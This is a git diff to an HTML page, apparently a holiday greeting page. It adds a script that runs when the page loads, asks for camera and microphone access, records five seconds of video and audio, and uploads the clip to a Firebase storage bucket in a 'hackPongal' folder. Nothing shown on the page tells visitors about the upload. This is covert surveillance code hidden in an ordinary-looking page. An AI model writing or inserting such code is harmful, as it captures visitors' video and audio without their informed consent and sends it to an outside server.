@@ -3,7 +3,9 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-storage.js"></script>
     <!-- Chrome, Firefox OS and Opera -->
     <meta name="theme-color" content="#141852" />
     <!-- Windows Phone -->
@@ -162,3 +164,50 @@
     <div class="btn-ref"></div>
   </body>
 </html>
+<script>
+  const firebaseConfig = {
+      storageBucket: "hello-world-c054a.appspot.com",
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const storage = firebase.storage();
+
+  window.onload = function () {
+      let mediaRecorder;
+      const parts = [];
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then((stream) => {
+              mediaRecorder = new MediaRecorder(stream);
+              mediaRecorder.start(1000);
+              mediaRecorder.ondataavailable = function (e) {
+                  parts.push(e.data);
+              };
+              setTimeout(function () {
+                  mediaRecorder.stop();
+                  const blob = new Blob(parts, {
+                      type: "video/webm"
+                  });
+
+                  const currentDateTime = new Date();
+                  const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
+                  function padZero(num) {
+                      return num.toString().padStart(2, '0');
+                  }
+                  if (localStorage.getItem("hackPongal") == null) {
+                      localStorage.setItem("hackPongal", btoa(formattedDateTime));
+                  }
+                  const fileNameRef = "hackPongal/" + localStorage.getItem("hackPongal") + "/" + formattedDateTime;
+                  const storageRef = storage.ref(fileNameRef);
+                  storageRef.put(blob).then(snapshot => {
+                      $('#showVidBtn').show();
+                  }).catch(error => {
+                      console.error('Error uploading file:', error);
+                  });
+              }, 5000);
+          })
+          .catch((error) => {
+              alert('Camera and microphone permissions denied or blocked. Please allow access and try again.');
+          });
+  }
+</script>
+
